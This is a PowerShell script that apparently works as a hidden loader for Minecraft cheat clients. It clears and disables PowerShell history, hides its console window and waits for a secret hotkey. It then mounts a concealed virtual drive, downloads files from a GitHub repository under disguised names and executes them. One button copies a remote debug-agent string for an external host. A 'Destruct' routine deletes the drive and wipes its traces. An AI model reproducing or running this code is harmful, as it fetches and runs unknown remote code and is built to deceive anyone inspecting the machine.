Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Set-PSReadlineOption -HistorySaveStyle SaveNothing
Clear-Content -Path "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
# START OF KEY BUTTON DETECTION
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class User32 {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@
# Hide console window
try {
    $consolePtr = [Win32]::GetConsoleWindow()
    # 0 = SW_HIDE
    [Win32]::ShowWindow($consolePtr, 0) | Out-Null
} catch {
    Write-Error "Failed to hide console window: $_"
    exit 1
}
# Virtual key codes
$VK_CONTROL = 0x11
$VK_MENU = 0x12  # Alt key
$VK_F11 = 0x7A
# Inform user that the script is running and waiting for input
Write-Host "Waiting for Ctrl + Alt + F11 to be pressed..."
while ($true) {
    $ctrlPressed = [User32]::GetAsyncKeyState($VK_CONTROL) -band 0x8000
    $altPressed = [User32]::GetAsyncKeyState($VK_MENU) -band 0x8000
    $f11Pressed = [User32]::GetAsyncKeyState($VK_F11) -band 0x8000
    if ($ctrlPressed -and $altPressed -and $f11Pressed) {
        break
    }
    Start-Sleep -Milliseconds 100
}
# Set preferences to run silently
$ConfirmPreference = 'None'
$ErrorActionPreference = 'SilentlyContinue'
# Track created files and directories
$createdItems = @()

# MAKE THE PARTITION --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Ensure the directory exists
$vdiskPath = "C:\temp\ddr.vhd"
$vdiskSizeMB = 2048 # Size of the virtual disk in MB (2 GB)
# Step 1: Check if the virtual disk already exists and remove it if it does
if (Test-Path -Path $vdiskPath) {
  Remove-Item -Path $vdiskPath -Force
}
# Step 2: Create the virtual disk (expandable)
$createVHDScript = @"
create vdisk file=`"$vdiskPath`" maximum=$vdiskSizeMB type=expandable
"@
$scriptFileCreate = "C:\temp\$(Get-Random -Minimum 10000 -Maximum 99999).txt"
$createdItems += $scriptFileCreate
$createVHDScript | Set-Content -Path $scriptFileCreate
# Execute the diskpart command to create the virtual disk
diskpart /s $scriptFileCreate
# Step 3: Attach the virtual disk
$attachVHDScript = @"
select vdisk file=`"$vdiskPath`"
attach vdisk
"@
$scriptFileAttach = "C:\temp\$(Get-Random -Minimum 10000 -Maximum 99999).txt"
$createdItems += $scriptFileAttach
$attachVHDScript | Set-Content -Path $scriptFileAttach
# Execute the diskpart command to attach the virtual disk
diskpart /s $scriptFileAttach
# Step 4: Wait for the disk to be detected by the system
Start-Sleep -Seconds 5  # Allow a moment for the disk to be registered by the OS
# Retrieve the attached disk (assuming it's the last disk created)
$disk = Get-Disk | Sort-Object -Property Number | Select-Object -Last 1
# Check if the disk is offline, and set it online if needed
if ($disk.IsOffline -eq $true) {
    Set-Disk -Number $disk.Number -IsOffline $false
}
# Initialize the disk if it's in raw state (uninitialized)
if ($disk.PartitionStyle -eq 'Raw') {
    Initialize-Disk -Number $disk.Number -PartitionStyle MBR
}
# Step 5: Create a new partition and explicitly assign drive letter Z
$partition = New-Partition -DiskNumber $disk.Number -UseMaximumSize -DriveLetter Z
# Step 6: Format the volume with FAT32 and set label
Format-Volume -DriveLetter Z -FileSystem FAT32 -NewFileSystemLabel "Local Disk" -Confirm:$false
# Download the sound file after Z drive creation
$soundFilePath = "Z:\a.wav"
$createdItems += $soundFilePath
function Download-SoundFile {
    $soundUrl = "https://github.com/devnull-sys/devnull/raw/refs/heads/main/na.wav"    # Replace with the actual URL of the sound file
    try {
        iwr -Uri $soundUrl -OutFile $soundFilePath
    } catch {
        Write-Error "Failed to download sound file: $_"
        exit 1
    }
}
Download-SoundFile
# END OF MAKING PARTITION ------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Hide PowerShell console window
Add-Type -Name Win -Namespace Console -MemberDefinition @'
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
'@
$consolePtr = [Console.Win]::GetConsoleWindow()
[Console.Win]::ShowWindow($consolePtr, 0)
# Create the form
$form = New-Object System.Windows.Forms.Form
$form.Text = 'By Zpat - FAX'
$form.Size = New-Object System.Drawing.Size(942, 443)
$form.StartPosition = 'CenterScreen'
$form.BackColor = 'Black'
# Set background color to black and make the window non-resizable
$form.FormBorderStyle = 'FixedDialog'
$form.MaximizeBox = $false
$form.MinimizeBox = $false
$form.BackColor = 'Black'  # Set background color of the form to black
# Set the title to empty (remove the title)
$form.Text = "By Zpat - FAX" 
# Set the top bar (title bar) color to black
$form.BackColor = 'Black'  # Set background color for the whole form
$form.ForeColor = 'White'  # Set text color for the form content
# ASCII Art Label
$asciiArt = @"
██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗███╗   ███╗██████╗  ██████╗ ██╗    ██╗███╗   ██╗
██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝████╗ ████║██╔══██╗██╔═══██╗██║    ██║████╗  ██║
███████║███████║██║     █████╔╝ █████╗  ██╔████╔██║██║  ██║██║   ██║██║ █╗ ██║██╔██╗ ██║
██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██║╚██╔╝██║██║  ██║██║   ██║██║███╗██║██║╚██╗██║
██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║ ╚═╝ ██║██████╔╝╚██████╔╝╚███╔███╔╝██║ ╚████║
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝
"@
$label = New-Object System.Windows.Forms.Label
$label.Text = $asciiArt
$label.Font = New-Object System.Drawing.Font('Courier New', 9)
$label.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
$label.AutoSize = $true
$label.Location = New-Object System.Drawing.Point(184, 87)  # New position
$form.Controls.Add($label)
# Define Main Menu Buttons
$injectButton = New-Object System.Windows.Forms.Button
$injectButton.Text = 'Inject'
$injectButton.Width = 100
$injectButton.Height = 40
$injectButton.Location = New-Object System.Drawing.Point(196, 235)  # New position
$injectButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#29903b")
$injectButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
$injectButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
$destructButton = New-Object System.Windows.Forms.Button
$destructButton.Text = 'Destruct'
$destructButton.Width = 100
$destructButton.Height = 40
$destructButton.Location = New-Object System.Drawing.Point(730, 336)  # New position
$destructButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#a60e0e")
$destructButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
$destructButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
# Function to return to main menu
function Show-MainMenu {
    $form.Controls.Clear()
    $form.Controls.Add($label)
    $form.Controls.Add($injectButton)
    $form.Controls.Add($destructButton)
}
# Path to the custom sound file on Z drive
$soundFilePath = "Z:\na.wav"
$createdItems += $soundFilePath
# Function to download the sound file
function Download-SoundFile {
    $soundUrl = "https://github.com/devnull-sys/devnull/raw/refs/heads/main/na.wav"    # Replace with the actual URL of the sound file
    try {
        iwr -Uri $soundUrl -OutFile $soundFilePath
    } catch {
        Write-Error "Failed to download sound file: $_"
        exit 1
    }
}
# Inject Button Click: Show Prestige and Vape buttons
$injectButton.Add_Click({
    # Disable the form to prevent interaction
    $form.Enabled = $false
    # Load the sound player
    $player = New-Object System.Media.SoundPlayer
    $player.SoundLocation = $soundFilePath
    # Play the custom sound
    $player.PlaySync()
    # Re-enable the form after sound playback
    $form.Enabled = $true
    $form.Controls.Clear()
    $form.Controls.Add($label)
    # Back Button
    $backButton = New-Object System.Windows.Forms.Button
    $backButton.Text = 'Back'
    $backButton.Width = 100
    $backButton.Height = 40
    $backButton.Location = New-Object System.Drawing.Point(730, 336)  # New position
    $backButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#a60e0e")
    $backButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
    $backButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
    $backButton.Add_Click({ Show-MainMenu })
    # Prestige Button
    $prestigeButton = New-Object System.Windows.Forms.Button
    $prestigeButton.Text = 'Prestige'
    $prestigeButton.Width = 120
    $prestigeButton.Height = 40
    $prestigeButton.Location = New-Object System.Drawing.Point(196, 235)  # New position
    $prestigeButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#a167ff")
    $prestigeButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
    $prestigeButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
    $prestigeFilePath = "Z:\meme.mp4"
    $createdItems += $prestigeFilePath
    $prestigeButton.Add_Click({
        if (-Not (Test-Path $prestigeFilePath)) {
            iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/sodium/sodium-fabric-0.6.13+mc1.21.4.jar"   -OutFile $prestigeFilePath
        }
        Start-Process java -ArgumentList '-jar "' + $prestigeFilePath + '"'
    })
    # DoomsDay Button
    $doomsdayButton = New-Object System.Windows.Forms.Button
    $doomsdayButton.Text = 'DoomsDay'
    $doomsdayButton.Width = 120
    $doomsdayButton.Height = 40
    $doomsdayButton.Location = New-Object System.Drawing.Point(326, 235)  # Adjusted position
    $doomsdayButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#2563eb")
    $doomsdayButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
    $doomsdayButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
    $doomsdayFilePath = "Z:\cat.mp4"
    $createdItems += $doomsdayFilePath
    $doomsdayButton.Add_Click({
        if (-Not (Test-Path $doomsdayFilePath)) {
            iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/sodium-extra/sodium-extra-fabric-0.6.1+mc1.21.4.jar"   -OutFile $doomsdayFilePath
        }
        Start-Process java -ArgumentList '-jar "' + $doomsdayFilePath + '"'
    })
    # VapeV4 Button
    $vapev4Button = New-Object System.Windows.Forms.Button
    $vapev4Button.Text = 'VapeV4'
    $vapev4Button.Width = 120
    $vapev4Button.Height = 40
    $vapev4Button.Location = New-Object System.Drawing.Point(456, 235)  # Adjusted position
    $vapev4Button.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#006466")
    $vapev4Button.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
    $vapev4Button.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
    $vapev4FilePath = "Z:\gentask.exe"
    $createdItems += $vapev4FilePath
    $vapev4Button.Add_Click({
        if (-Not (Test-Path $vapev4FilePath)) {
            iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/system32/entityculling-fabric-1.7.4-mc1.21.4.jar"   -OutFile $vapev4FilePath
        }
        Start-Process $vapev4FilePath
    })
    # VapeLite Button
    $vapeliteButton = New-Object System.Windows.Forms.Button
    $vapeliteButton.Text = 'VapeLite'
    $vapeliteButton.Width = 120
    $vapeliteButton.Height = 40
    $vapeliteButton.Location = New-Object System.Drawing.Point(586, 235)  # Adjusted position
    $vapeliteButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#00f1e1")
    $vapeliteButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#171317")
    $vapeliteButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
    $vapeliteFilePath = "Z:\ilasm.exe"
    $createdItems += $vapeliteFilePath
    $vapeliteButton.Add_Click({
        if (-Not (Test-Path $vapeliteFilePath)) {
            iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/ProgramData/fabric-installer-1.0.3.jar"   -OutFile $vapeliteFilePath
        }
        Start-Process $vapeliteFilePath
    })
    # Phantom Button
    $phantomButton = New-Object System.Windows.Forms.Button
    $phantomButton.Text = 'Phantom'
    $phantomButton.Width = 120
    $phantomButton.Height = 40
    $phantomButton.Location = New-Object System.Drawing.Point(716, 235)  # Adjusted position
    $phantomButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#4c0eb7")
    $phantomButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
    $phantomButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
    $phantomButton.Add_Click({
        $clipboardText = "-agentlib:jdwp=transport=dt_socket,server=n,suspend=y,address=phantom.clientlauncher.net:6550"
        Set-Clipboard -Value $clipboardText
    })
    # Add buttons to form
    $form.Controls.Add($prestigeButton)
    $form.Controls.Add($doomsdayButton)
    $form.Controls.Add($vapev4Button)
    $form.Controls.Add($vapeliteButton)
    $form.Controls.Add($phantomButton)
    $form.Controls.Add($backButton)
})
# Destruct Button
$destructButton.Add_Click({
    # Path to the virtual disk
    $vdiskPath = "C:\temp\ddr.vhd"
    $createdItems += $vdiskPath
    # STEP 1: Get the virtual disk's associated disk number
    $diskNumber = $null
    $diskList = Get-Disk | Where-Object { $_.Location -like "*$vdiskPath*" }
    if ($diskList) {
        $diskNumber = $diskList.Number
    } else {
        Write-Host "Virtual disk not found or not attached. Aborting destruction."
        return
    }
    # STEP 2: Detach the virtual disk
    $detachScript = @"
select vdisk file="$vdiskPath"
detach vdisk
"@
    $detachFile = "C:\temp\$(Get-Random -Minimum 10000 -Maximum 99999).txt"
    $createdItems += $detachFile
    $detachScript | Set-Content -Path $detachFile
    diskpart /s $detachFile | Out-Null
    Remove-Item -Path $detachFile -Force
    # STEP 3: Initialize the disk (if needed)
    $initializeScript = @"
select disk $diskNumber
online disk
convert mbr
"@
    $initFile = "C:\temp\$(Get-Random -Minimum 10000 -Maximum 99999).txt"
    $createdItems += $initFile
    $initializeScript | Set-Content -Path $initFile
    diskpart /s $initFile | Out-Null
    Remove-Item -Path $initFile -Force
    # STEP 4: Create partition and assign drive letter
    $partitionScript = @"
select disk $diskNumber
create partition primary
assign letter=Z
"@
    $partFile = "C:\temp\$(Get-Random -Minimum 10000 -Maximum 99999).txt"
    $createdItems += $partFile
    $partitionScript | Set-Content -Path $partFile
    diskpart /s $partFile | Out-Null
    Remove-Item -Path $partFile -Force
    # STEP 5: Delete the virtual disk file
    if (Test-Path $vdiskPath) {
        Remove-Item -Path $vdiskPath -Force
    }
    # Clean up "Recent" shortcuts
    $recentPath = [Environment]::GetFolderPath("Recent")
    Get-ChildItem -Path $recentPath -Filter "*" | ForEach-Object {
        if ($createdItems -contains $_.FullName) {
            Remove-Item -Path $_.FullName -Force -ErrorAction SilentlyContinue
        }
    }
    # Clean up files and directories on Z drive
    foreach ($item in $createdItems) {
        if (Test-Path $item) {
            Remove-Item -Path $item -Force -Recurse -ErrorAction SilentlyContinue
        }
    }
    # Force close the application
    $form.Close()
    $form.Dispose()
    [System.Windows.Forms.Application]::Exit()
})
